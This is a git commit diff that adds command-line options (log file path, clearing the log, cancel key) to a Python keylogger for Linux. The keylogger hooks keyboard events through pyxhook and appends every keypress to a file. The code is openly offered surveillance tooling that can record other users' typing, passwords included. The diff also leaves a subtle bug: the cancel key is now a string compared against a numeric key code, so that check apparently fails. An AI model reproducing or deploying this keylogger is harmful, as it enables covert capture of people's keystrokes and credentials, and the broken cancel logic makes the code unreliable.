e3653c945c2ddd77370f7483dbbcf5e09fc83030
Bahram Aghaei <aghaee.bahram@gmail.com>
2018-12-04 10:36:56 +0000

    add cli (#64)

--- linux/keylogger/keylogger.py
+++ linux/keylogger/keylogger.py
@@ -1,34 +1,40 @@
 #!/usr/bin/env python
 import os
+from argparse import ArgumentParser
 
 from keylogger import pyxhook
 
 
 def main():
-    # This tells the keylogger where the log file will go.
-    # You can set the file path as an environment variable ('pylogger_file'),
-    # or use the default ~/Desktop/file.log
-    log_file = os.environ.get(
-        'pylogger_file',
-        os.path.expanduser('~/Desktop/file.log')
-    )
+    parser = ArgumentParser(description='A simple keylogger for Linux.')
+    parser.add_argument(
+            '--log-file',
+            default=os.path.join(os.getcwd(), 'output.log'),
+            help='Save the output in this file.',
+            )
+    parser.add_argument(
+            '--clean-file',
+            action='store_true',
+            default=False,
+            help='Clear the log file on startup.Default is No',
+            )
+    parser.add_argument(
+            '--cancel-key',
+            help='A single key that use as the cancel key, Default is ` (backtick)',
+            )
 
-    # Allow setting the cancel key from environment args, Default: `
-    cancel_key = ord(
-        os.environ.get(
-            'pylogger_cancel',
-            '`'
-        )[0]
-    )
+    args = parser.parse_args()
 
-    # Allow clearing the log file on start, if pylogger_clean is defined.
-    if os.environ.get('pylogger_clean', None) is not None:
+    log_file = args.log_file
+
+    if args.clean_file:
         try:
             os.remove(log_file)
-        except EnvironmentError:
-            # File does not exist, or no permissions.
+        except OSError:
+            # TODO: log with logging module
             pass
 
+    cancel_key = args.cancel_key[0] if args.cancel_key else  '`'
 
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
@@ -37,10 +43,10 @@ def main():
         if event.Ascii == cancel_key:
             new_hook.cancel()
 
-
     new_hook = pyxhook.HookManager()
     new_hook.KeyDown = OnKeyPress
     new_hook.HookKeyboard()
+
     try:
         new_hook.start()
     except KeyboardInterrupt:
